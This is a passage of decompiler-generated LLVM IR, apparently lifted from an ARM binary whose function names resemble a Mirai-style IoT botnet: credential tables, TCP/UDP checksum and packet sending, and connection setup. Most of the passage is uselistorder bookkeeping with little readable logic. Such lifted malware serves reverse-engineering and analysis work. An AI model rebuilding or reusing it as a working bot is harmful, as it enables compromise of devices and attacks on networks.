  store i1 true, i1* %cpsr_z.global-to-local, align 1
  store i32 31, i32* %r0.global-to-local, align 4
  %v1_10490 = call i32 @table_lock_val(i32 31)
  store i32 32, i32* %r0.global-to-local, align 4
  %v1_10498 = call i32 @table_lock_val(i32 32)
  store i32 %v1_10498, i32* %r0.global-to-local, align 4
  %v0_1049c = load i32, i32* @r6, align 4
  %v1_1049c = add i32 %v0_1049c, 12
  %v2_1049c = inttoptr i32 %v1_1049c to i32*
  %v3_1049c = load i32, i32* %v2_1049c, align 4
  store i32 %v3_1049c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_f71c.backedge

dec_label_pc_104a4:                               ; preds = %dec_label_pc_f7d4
  store i32 %v0_f348, i32* @r1, align 4
  store i32 104, i32* %r3.global-to-local, align 4
  store i32 104, i32* %v2_f364, align 4
  br label %dec_label_pc_f7f0

dec_label_pc_104b4:                               ; preds = %dec_label_pc_ee34
  store i32 ptrtoint (i32* @global_var_24f98.155 to i32), i32* %ip.global-to-local, align 4
  %v2_104b8 = load i32, i32* @global_var_24f98.155, align 4
  store i32 %v2_104b8, i32* %r0.global-to-local, align 4
  %v1_104bc = call i32 @__GI___libc_close(i32 %v2_104b8)
  store i32 %v1_104bc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_104c0

dec_label_pc_104c0:                               ; preds = %dec_label_pc_ee10, %dec_label_pc_104b4
  %v0_104c0 = load i32, i32* @r5, align 4
  store i32 %v0_104c0, i32* %r0.global-to-local, align 4
  %v1_104c4 = call i32 @__GI_exit(i32 %v0_104c0)
  store i32 %v1_104c4, i32* %r0.global-to-local, align 4
  ret i32 %v1_104c4

; uselistorder directives
  uselistorder i32 %v3_1049c, { 1, 0 }
  uselistorder i32 %v0_1049c, { 1, 0 }
  uselistorder i32 %v3_10368, { 1, 0 }
  uselistorder i32 %v0_10364, { 1, 0, 2 }
  uselistorder i32 %v3_10318, { 1, 0 }
  uselistorder i32 %v1_1030c, { 1, 0 }
  uselistorder i32 %v1_10304, { 1, 2, 0 }
  uselistorder i1 %v9_102fc, { 1, 0 }
  uselistorder i32 %v0_1030c, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v3_102c0, { 2, 1, 0, 3 }
  uselistorder i32 %v3_102bc, { 1, 0 }
  uselistorder i32 %v0_102b4, { 1, 0 }
  uselistorder i32 %v3_10230, { 1, 0 }
  uselistorder i32 %v1_101f0, { 2, 1, 0 }
  uselistorder i32 %v0_1016c.pr, { 1, 0 }
  uselistorder i32 %v0_10138, { 1, 2, 0 }
  uselistorder i32 %v4_100d8, { 1, 0, 2 }
  uselistorder i1 %v7_100b4, { 1, 0 }
  uselistorder i32 %v1_1005c, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_1005c, { 0, 2, 1 }
  uselistorder i32 %v0_10054, { 1, 0 }
  uselistorder i1 %v7_10050, { 1, 0 }
  uselistorder i1 %v7_10048, { 1, 0 }
  uselistorder i1 %v7_10040, { 1, 0 }
  uselistorder i1 %v8_10038, { 1, 0 }
  uselistorder i1 %v7_1001c, { 1, 0 }
  uselistorder i1 %v7_10014, { 1, 0 }
  uselistorder i1 %v7_1000c, { 1, 0 }
  uselistorder i1 %v8_10004, { 1, 0 }
  uselistorder i32 %v1_ffec, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i1 %v8_ff88, { 1, 0 }
  uselistorder i8 %v3_ff80, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_ff78, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_ff78, { 0, 2, 1 }
  uselistorder i32 %v0_ff70, { 1, 0 }
  uselistorder i1 %v7_ff6c, { 1, 0 }
  uselistorder i1 %v7_ff64, { 1, 0 }
  uselistorder i1 %v7_ff5c, { 1, 0 }
  uselistorder i1 %v7_ff48, { 1, 0 }
  uselistorder i1 %v7_ff40, { 1, 0 }
  uselistorder i1 %v7_ff38, { 1, 0 }
  uselistorder i1 %v8_ff30, { 1, 0 }
  uselistorder i32 %v1_ff18, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i32 %v4_fec0, { 1, 0, 2 }
  uselistorder i32 %v1_fe8c, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32 %v0_fe8c, { 0, 2, 1 }
  uselistorder i32 %v0_fe84, { 1, 0 }
  uselistorder i1 %v7_fe80, { 1, 0 }
  uselistorder i1 %v7_fe78, { 1, 0 }
  uselistorder i1 %v8_fe70, { 1, 0 }
  uselistorder i1 %v7_fe54, { 1, 0 }
  uselistorder i1 %v7_fe4c, { 1, 0 }
  uselistorder i1 %v8_fe44, { 1, 0 }
  uselistorder i32 %v1_fe2c, { 1, 2, 3, 4, 5, 0, 6, 7, 8 }
  uselistorder i1 %v8_fdc8, { 1, 0 }
  uselistorder i8 %v3_fdc0, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_fdb8, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_fdb8, { 0, 2, 1 }
  uselistorder i32 %v0_fdb0, { 1, 0 }
  uselistorder i1 %v7_fdac, { 1, 0 }
  uselistorder i1 %v7_fda4, { 1, 0 }
  uselistorder i1 %v7_fd9c, { 1, 0 }
  uselistorder i1 %v7_fd14, { 1, 0 }
  uselistorder i1 %v7_fd0c, { 1, 0 }
  uselistorder i1 %v7_fd04, { 1, 0 }
  uselistorder i1 %v8_fcfc, { 1, 0 }
  uselistorder i32 %v1_fce4, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i1 %v8_fc80, { 1, 0 }
  uselistorder i8 %v3_fc78, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_fc70, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_fc70, { 0, 2, 1 }
  uselistorder i32 %v0_fc68, { 1, 0 }
  uselistorder i1 %v7_fc64, { 1, 0 }
  uselistorder i1 %v7_fc5c, { 1, 0 }
  uselistorder i1 %v7_fc54, { 1, 0 }
  uselistorder i1 %v7_fc40, { 1, 0 }
  uselistorder i1 %v7_fc38, { 1, 0 }
  uselistorder i1 %v7_fc30, { 1, 0 }
  uselistorder i1 %v8_fc28, { 1, 0 }
  uselistorder i32 %v1_fc10, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i1 %v8_fbac, { 1, 0 }
  uselistorder i8 %v3_fba4, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_fb9c, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_fb9c, { 0, 2, 1 }
  uselistorder i32 %v0_fb94, { 1, 0 }
  uselistorder i1 %v7_fb90, { 1, 0 }
  uselistorder i1 %v7_fb88, { 1, 0 }
  uselistorder i1 %v7_fb80, { 1, 0 }
  uselistorder i1 %v7_fb6c, { 1, 0 }
  uselistorder i1 %v7_fb64, { 1, 0 }
  uselistorder i1 %v7_fb5c, { 1, 0 }
  uselistorder i1 %v8_fb54, { 1, 0 }
  uselistorder i32 %v1_fb3c, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i32 %v0_fb28, { 1, 0 }
  uselistorder i32 %v1_fb20, { 1, 0 }
  uselistorder i32 %v1_fb18, { 0, 2, 3, 4, 5, 1 }
  uselistorder i32 %v3_fb14, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v0_fb14, { 0, 2, 1 }
  uselistorder i32 %v0_faf4.pr, { 1, 0 }
  uselistorder i32 %v0_fad4.pr, { 1, 0 }
  uselistorder i1 %v7_faac, { 1, 0 }
  uselistorder i1 %v2_fa9c, { 1, 0, 2 }
  uselistorder i1 %v2_fa80, { 1, 0, 2 }
  uselistorder i32 %v1_faa0, { 1, 2, 3, 0 }
  uselistorder i32 %v1_fa74, { 4, 2, 1, 3, 0 }
  uselistorder i32 %v2_faa4, { 0, 1, 4, 2, 3, 5 }
  uselistorder i1 %v8_fa08, { 1, 0 }
  uselistorder i8 %v3_fa00, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_f9f8, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_f9f8, { 0, 2, 1 }
  uselistorder i32 %v0_f9f0, { 1, 0 }
  uselistorder i1 %v7_f9ec, { 1, 0 }
  uselistorder i1 %v7_f9e4, { 1, 0 }
  uselistorder i1 %v7_f9dc, { 1, 0 }
  uselistorder i1 %v7_f9c8, { 1, 0 }
  uselistorder i1 %v7_f9c0, { 1, 0 }
  uselistorder i1 %v7_f9b8, { 1, 0 }
  uselistorder i1 %v8_f9b0, { 1, 0 }
  uselistorder i32 %v1_f998, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i32 %v0_f984, { 1, 2, 0 }
  uselistorder i32 %v2_f970, { 1, 0 }
  uselistorder i32 %v0_f970, { 2, 4, 0, 1, 3, 5 }
  uselistorder i32 %v3_f96c, { 2, 1, 4, 0, 5, 3 }
  uselistorder i1 %v7_f918, { 1, 0 }
  uselistorder i32 %v3_f914, { 1, 0, 2, 3 }
  uselistorder i1 %v2_f900, { 1, 0 }
  uselistorder i32 %.465, { 1, 0 }
  uselistorder i1 %v7_f8e8, { 1, 0 }
  uselistorder i32 %v0_f8e4, { 2, 1, 0, 3 }
  uselistorder i1 %v7_f8bc, { 1, 0 }
  uselistorder i32 %v0_f8bc, { 2, 1, 0, 3 }
  uselistorder i32 %v1_f82c, { 2, 0, 3, 4, 5, 1 }
  uselistorder i1 %v1_f810, { 1, 0 }
  uselistorder i32 %v1_f800, { 2, 1, 0 }
  uselistorder i32 %v1_f7fc, { 1, 0 }
  uselistorder i32 %v0_f79c, { 2, 5, 6, 20, 7, 8, 24, 9, 10, 21, 11, 12, 25, 13, 14, 22, 15, 16, 23, 4, 3, 19, 17, 18, 26, 27, 1, 0 }
  uselistorder i32 %v1_f778, { 1, 2, 3, 0 }
  uselistorder i32 %v3_f774, { 1, 0 }
  uselistorder i32 %v4_f758, { 0, 4, 1, 2, 3, 5, 6, 7 }
  uselistorder i32 %v2_f744, { 1, 0, 2 }
  uselistorder i32 %v3_f740, { 1, 0, 2 }
  uselistorder i32 %v0_10240, { 1, 0, 2 }
  uselistorder i32 %v3_f708, { 1, 0 }
  uselistorder i32 %v1_f6f0, { 3, 2, 1, 0 }
  uselistorder i32 %v3_f6ec, { 1, 0 }
  uselistorder i32 %v3_f6e4, { 1, 2, 0 }
  uselistorder i1 %v7_f6d4, { 1, 0 }
  uselistorder i32 %v3_f6d0, { 3, 2, 1, 0, 4, 5 }
  uselistorder i32 %v0_f6c4, { 1, 0 }
  uselistorder i32 %v1_f66c, { 0, 1, 3, 2 }
  uselistorder i32 %v0_f66c, { 0, 1, 3, 2 }
  uselistorder i32 %v0_f650, { 0, 2, 1 }
  uselistorder i32 %v1_f648, { 1, 0 }
  uselistorder i32 %v1_f608, { 2, 1, 0 }
  uselistorder i32 %v1_f604, { 1, 0 }
  uselistorder i1 %v2_f5e4, { 1, 0, 2 }
  uselistorder i32 %v0_f5e0, { 1, 0, 2 }
  uselistorder i1 %v7_f5ac, { 0, 3, 4, 1, 2 }
  uselistorder i1 %v2_f5ac, { 1, 0, 2 }
  uselistorder i32 %v2_f5a4, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v2_f598, { 1, 0, 2 }
  uselistorder i32 %v0_f59c, { 1, 0 }
  uselistorder i32 %v1_f580, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 %v1_f574, { 0, 1, 3, 2 }
  uselistorder i32 %v0_f574, { 0, 2, 1 }
  uselistorder i32 %v1_f564, { 1, 0 }
  uselistorder i32 %v3_f630, { 4, 7, 5, 6, 1, 0, 9, 3, 2, 8 }
  uselistorder i32 %v1_f4c4, { 1, 0 }
  uselistorder i32 %v1_f4ac, { 0, 2, 3, 1 }
  uselistorder i32 %v0_f4b8, { 0, 3, 2, 1 }
  uselistorder i32 %v0_f468, { 2, 3, 4, 1, 0, 5, 7, 6 }
  uselistorder i32 %v5_f45c, { 2, 1, 0 }
  uselistorder i32 %v1_f43c, { 2, 3, 0, 1, 4 }
  uselistorder i1 %v2_f418, { 1, 0 }
  uselistorder i1 %v9_f3e4, { 1, 0 }
  uselistorder i32* %v2_f364, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_f348, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v1_f334, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v2_f2e4, { 1, 0 }
  uselistorder i32 %v5_f27c, { 1, 0 }
  uselistorder i32 %v3_f26c, { 1, 2, 0 }
  uselistorder i16 %v4_f268, { 1, 0 }
  uselistorder i32 %v3_f268, { 1, 0 }
  uselistorder i1 %v2_f1a4, { 1, 0 }
  uselistorder i1 %v2_f190, { 1, 0 }
  uselistorder i1 %v2_f17c, { 1, 0 }
  uselistorder i32 %.464, { 2, 1, 0 }
  uselistorder i1 %v7_f158, { 2, 1, 0, 5, 4, 3 }
  uselistorder i1 %v2_f140, { 1, 0 }
  uselistorder i1 %v3_f124, { 1, 0, 2 }
  uselistorder i1 %v2_f110, { 1, 0 }
  uselistorder i1 %v2_f0ec, { 1, 0 }
  uselistorder i32 %v1_f09c, { 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 31, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_f088, { 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 30, 31, 32, 29, 28, 27, 26, 25, 24, 23, 22, 20, 21, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 6, 7, 8, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_f084, { 4, 5, 6, 7, 0, 8, 1, 2, 3, 9 }
  uselistorder i32 %v0_f06c, { 1, 0 }
  uselistorder i32 %stack_var_-1880.0, { 0, 3, 2, 1 }
  uselistorder i32 %v2_103b0, { 2, 3, 1, 0 }
  uselistorder i32 %v2_f8d4, { 1, 2, 3, 0 }
  uselistorder i32 %v2_10078, { 4, 5, 1, 0, 12, 13, 8, 11, 7, 10, 9, 6, 3, 2 }
  uselistorder i32 %v2_10120, { 1, 2, 0 }
  uselistorder i32 %v2_f63c, { 0, 5, 1, 4, 2, 7, 3, 6 }
  uselistorder i32 %v2_f02c, { 2, 3, 6, 5, 7, 0, 1, 4, 8, 9 }
  uselistorder i32 %v4_ef0c, { 2, 1, 0, 3 }
  uselistorder i16 %v5_eea0.le, { 1, 0 }
  uselistorder i32 %v0_ee84, { 3, 2, 0, 1 }
  uselistorder i32 %v2_ee58, { 3, 2, 0, 1 }
  uselistorder i1 %v7_ee24, { 1, 0 }
  uselistorder i32 %v3_ee1c, { 1, 3, 2, 0, 4, 5 }
  uselistorder i32 %v0_ee08, { 1, 0 }
  uselistorder i32 %v2_edec, { 1, 0, 2 }
  uselistorder i32 %v0_edd8, { 1, 2, 0 }
  uselistorder i32 %storemerge329, { 1, 0 }
  uselistorder i32 %v0_ed4c, { 3, 1, 2, 0, 4 }
  uselistorder i32* %stack_var_-52, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 13, 11, 12 }
  uselistorder i32* %stack_var_-60, { 10, 11, 12, 0, 1, 13, 5, 14, 2, 15, 6, 16, 3, 17, 4, 18, 7, 19, 20, 8, 21, 9, 22 }
  uselistorder i32* %r3.global-to-local, { 74, 63, 64, 65, 66, 67, 68, 69, 70, 75, 76, 77, 78, 79, 80, 81, 82, 83, 85, 84, 86, 87, 42, 1, 2, 3, 43, 44, 45, 46, 47, 4, 5, 6, 7, 8, 9, 11, 10, 12, 13, 14, 15, 18, 16, 17, 19, 20, 21, 22, 23, 25, 24, 26, 27, 28, 29, 31, 30, 32, 33, 34, 35, 37, 36, 38, 39, 40, 41, 48, 49, 50, 51, 52, 53, 54, 55, 56, 58, 57, 59, 60, 61, 62, 0, 71, 72, 73, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 121, 122, 124, 123, 120, 125, 164, 165, 126, 127, 163, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 119, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 155, 154, 157, 156, 113, 158, 159, 160, 161, 162, 111, 112, 114, 115, 116, 117, 118 }
  uselistorder i32* %r2.global-to-local, { 35, 36, 37, 38, 39, 40, 41, 42, 43, 51, 52, 53, 54, 27, 44, 0, 1, 28, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 29, 30, 31, 32, 33, 34, 45, 46, 47, 48, 49, 50, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 69, 87, 88, 89, 90, 92, 91, 70, 117, 93, 118, 94, 115, 116, 95, 96, 97, 98, 99, 100, 101, 102, 103, 68, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86 }
  uselistorder i32* %r1.global-to-local, { 43, 44, 45, 46, 47, 48, 49, 50, 51, 0, 52, 59, 60, 61, 35, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 36, 104, 37, 38, 39, 40, 41, 42, 86, 87, 53, 54, 55, 56, 57, 58, 62, 63, 64, 65, 66, 67, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85 }
  uselistorder i32* %r0.global-to-local, { 133, 132, 135, 134, 1, 3, 2, 4, 81, 83, 82, 85, 84, 87, 86, 89, 88, 90, 92, 91, 93, 94, 95, 96, 97, 98, 100, 99, 101, 103, 102, 104, 0, 106, 105, 139, 136, 137, 138, 66, 140, 107, 142, 67, 69, 68, 109, 108, 110, 32, 6, 5, 9, 8, 11, 10, 12, 70, 14, 13, 15, 17, 16, 19, 18, 20, 21, 22, 23, 24, 26, 25, 28, 27, 30, 29, 31, 34, 33, 36, 35, 208, 37, 39, 38, 40, 41, 42, 44, 43, 46, 45, 48, 47, 49, 50, 52, 51, 54, 53, 56, 55, 57, 58, 60, 59, 62, 61, 64, 63, 65, 72, 71, 73, 75, 74, 77, 76, 79, 78, 80, 111, 113, 112, 114, 116, 115, 117, 118, 120, 119, 121, 123, 122, 124, 126, 125, 127, 128, 129, 130, 156, 141, 145, 143, 144, 151, 146, 147, 148, 7, 149, 150, 152, 154, 153, 155, 157, 159, 158, 187, 185, 186, 190, 188, 189, 193, 191, 192, 195, 194, 131, 184, 197, 196, 198, 200, 199, 202, 201, 203, 204, 205, 206, 207, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 173, 172, 174, 179, 175, 176, 177, 178, 180, 181, 182, 183 }
  uselistorder i32* %ip.global-to-local, { 1, 2, 3, 4, 11, 9, 10, 12, 22, 13, 14, 15, 16, 17, 18, 19, 0, 20, 21, 5, 6, 7, 8 }
  uselistorder i1* %cpsr_z.global-to-local, { 4, 150, 0, 166, 32, 112, 126, 127, 137, 138, 113, 114, 81, 82, 83, 84, 85, 3, 124, 5, 6, 7, 13, 8, 9, 10, 11, 12, 14, 15, 16, 17, 18, 19, 23, 24, 25, 20, 21, 22, 26, 27, 28, 29, 30, 31, 136, 33, 38, 34, 35, 36, 37, 39, 40, 41, 42, 43, 47, 48, 49, 44, 45, 46, 50, 51, 52, 53, 54, 55, 59, 60, 61, 56, 57, 58, 62, 63, 64, 65, 66, 67, 71, 72, 73, 68, 69, 70, 74, 75, 76, 77, 78, 79, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 1, 103, 104, 105, 100, 101, 102, 106, 107, 108, 109, 110, 111, 115, 116, 119, 121, 123, 135, 125, 129, 130, 131, 139, 141, 140, 142, 143, 144, 145, 146, 147, 148, 149, 2, 80, 151, 152, 153, 154, 155, 157, 156, 158, 159, 160, 169, 171, 172, 170, 161, 168, 122, 120, 117, 173, 118, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 134, 212, 213, 241, 214, 215, 240, 216, 217, 218, 219, 220, 221, 133, 222, 223, 224, 225, 226, 132, 227, 228, 229, 167, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 162, 163, 164, 128, 165 }
  uselistorder i1* %cpsr_c.global-to-local, { 3, 146, 127, 160, 31, 107, 108, 133, 119, 121, 134, 110, 79, 80, 81, 82, 2, 132, 4, 5, 6, 12, 7, 8, 9, 10, 11, 13, 14, 15, 16, 17, 18, 22, 23, 24, 19, 20, 21, 25, 26, 27, 28, 29, 30, 131, 32, 37, 33, 34, 35, 36, 38, 39, 40, 41, 42, 46, 47, 48, 43, 44, 45, 49, 50, 51, 52, 53, 54, 58, 59, 60, 55, 56, 57, 61, 62, 63, 64, 65, 66, 70, 71, 72, 67, 68, 69, 73, 74, 75, 76, 77, 78, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 109, 98, 99, 100, 95, 96, 97, 101, 102, 103, 104, 105, 106, 113, 114, 116, 118, 120, 130, 122, 124, 125, 126, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 0, 1, 147, 148, 149, 150, 151, 152, 153, 154, 164, 166, 167, 165, 155, 163, 117, 115, 111, 168, 112, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 235, 205, 206, 234, 207, 208, 129, 209, 210, 211, 212, 213, 214, 128, 215, 216, 217, 218, 219, 162, 220, 221, 222, 161, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 156, 157, 158, 123, 159 }
  uselistorder i32 (i32)* @resolv_entries_free, { 1, 0 }
  uselistorder i16** @global_var_224ac.148, { 1, 0 }
  uselistorder i16* bitcast (i16** @global_var_224ac.148 to i16*), { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @getsockopt, { 1, 0 }
  uselistorder i8 31, { 6, 0, 1, 2, 3, 7, 8, 4, 5 }
  uselistorder i32 251, { 4, 5, 6, 0, 1, 2, 3 }
  uselistorder i8 -3, { 3, 4, 1, 5, 2, 6, 0 }
  uselistorder i8 -4, { 3, 4, 1, 5, 2, 6, 0 }
  uselistorder i32 ptrtoint ([3 x i8]* @global_var_19b60.207 to i32), { 5, 7, 2, 8, 6, 9, 3, 10, 0, 11, 1, 12, 4, 13 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_send, { 15, 14, 13, 12, 11, 10, 9, 19, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 18, 17, 16, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i8 37, { 0, 1, 6, 7, 8, 9, 2, 3, 4, 5, 10, 11 }
  uselistorder i8 34, { 0, 1, 8, 9, 2, 3, 10, 11, 4, 5, 6, 7, 12, 13 }
  uselistorder i8 36, { 0, 1, 2, 3, 14, 15, 16, 17, 4, 5, 18, 19, 20, 21, 6, 7, 8, 9, 10, 11, 12, 13, 22, 23, 24, 25 }
  uselistorder i8 35, { 0, 1, 2, 3, 16, 17, 18, 19, 4, 5, 6, 7, 20, 21, 22, 23, 8, 9, 10, 11, 12, 13, 14, 15, 24, 25, 26, 27 }
  uselistorder i8 58, { 0, 1, 8, 9, 2, 3, 10, 11, 4, 5, 6, 7, 12, 13, 14, 15 }
  uselistorder i8 57, { 0, 1, 8, 9, 2, 3, 10, 11, 4, 5, 6, 7, 12, 13 }
  uselistorder i8 62, { 0, 1, 8, 9, 2, 3, 10, 11, 4, 5, 6, 7, 12, 13 }
  uselistorder i8 61, { 0, 1, 8, 9, 2, 3, 10, 11, 4, 5, 6, 7, 12, 13 }
  uselistorder i32 (i32)* @resolv_lookup, { 1, 0 }
  uselistorder i32 (i32)* @table_lock_val, { 50, 49, 37, 36, 35, 43, 48, 47, 46, 45, 44, 42, 41, 40, 39, 38, 34, 33, 2, 30, 29, 28, 32, 31, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @util_memsearch, { 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32*)* @table_retrieve_val, { 8, 0, 1, 2, 3, 4, 5, 6, 7, 9, 10, 11, 39, 14, 15, 16, 12, 13, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 40, 41, 42 }
  uselistorder i32 (i32)* @table_unlock_val, { 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 3, 22, 21, 20, 24, 23, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_recv, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__libc_select, { 1, 2, 0 }
  uselistorder i32 ()* @setup_connection, { 2, 1, 0 }
  uselistorder i32 254, { 4, 5, 6, 0, 1, 2, 3 }
  uselistorder i8 2, { 0, 2, 1 }
  uselistorder i8 5, { 11, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10 }
  uselistorder i32 39, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @__libc_recvfrom, { 0, 3, 2, 1 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @__libc_sendto, { 2, 9, 8, 7, 6, 5, 4, 3, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @checksum_tcpudp, { 2, 9, 8, 7, 6, 5, 4, 3, 1, 0 }
  uselistorder i32 4873, { 1, 0 }
  uselistorder i32* @global_var_22498.202, { 1, 0 }
  uselistorder i16* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_22494.160 to i32), i32 2) to i16*), { 1, 0 }
  uselistorder i32 (i32, i32)* @checksum_generic, { 4, 11, 10, 9, 8, 7, 6, 5, 3, 2, 1, 0 }
  uselistorder i16* bitcast (i32* @global_var_2248a.199 to i16*), { 1, 0, 2 }
  uselistorder i32 (i32)* @llvm.bswap.i32, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 17, 18, 15, 16, 21, 22, 19, 20, 23, 24, 25, 26, 27, 28, 29 }
  uselistorder i32 214, { 1, 0 }
  uselistorder i32 29, { 4, 3, 0, 1, 2 }
  uselistorder i32 184, { 1, 0 }
  uselistorder i32 185, { 1, 0 }
  uselistorder i32 223, { 4, 0, 1, 2, 3 }
  uselistorder i32 ptrtoint ([6 x i8]* @global_var_19b08.181 to i32), { 0, 4, 1, 2, 3, 5 }
  uselistorder i32 ptrtoint ([8 x i8]* @global_var_19af4.177 to i32), { 0, 4, 1, 5, 2, 6, 3, 7 }
  uselistorder i32 (i32, i32, i32)* @add_auth_entry, { 5, 4, 3, 2, 1, 0, 14, 13, 12, 11, 10, 9, 8, 7, 6 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_19ad8.171 to i32), { 0, 8, 1, 9, 2, 10, 3, 11, 4, 12, 5, 13, 6, 14, 7, 15 }
  uselistorder i32 ptrtoint (i32* @global_var_19adc.169 to i32), { 1, 2, 0, 3 }
  uselistorder i8* @global_var_224a1.166, { 1, 0 }
  uselistorder i16* @global_var_22496.165, { 1, 0 }
  uselistorder i16 5888, { 1, 0, 2, 3 }
  uselistorder i32 5888, { 2, 0, 3, 1 }
  uselistorder i8 6, { 2, 3, 4, 0, 1 }
  uselistorder i8 16, { 13, 0, 1, 2, 14, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder i16* @global_var_22494.160, { 0, 2, 1 }
  uselistorder i32 ptrtoint (i16* @global_var_22494.160 to i32), { 5, 2, 1, 0, 4, 3 }
  uselistorder i8* @global_var_224a0.161, { 1, 0 }
  uselistorder i32 10240, { 1, 0, 2 }
  uselistorder i8** @global_var_22480.157, { 1, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_22480.157 to i32), { 2, 10, 3, 1, 0, 9, 4, 8, 7, 6, 5 }
  uselistorder i32 1023, { 2, 0, 1 }
  uselistorder i32 ()* @rand_next, { 74, 71, 21, 20, 70, 69, 68, 72, 67, 66, 65, 73, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 2, 1, 0, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__GI_setsockopt, { 10, 9, 8, 7, 6, 5, 0, 4, 3, 2, 1 }
  uselistorder i32* @global_var_24f98.155, { 1, 2, 3, 4, 0, 5 }
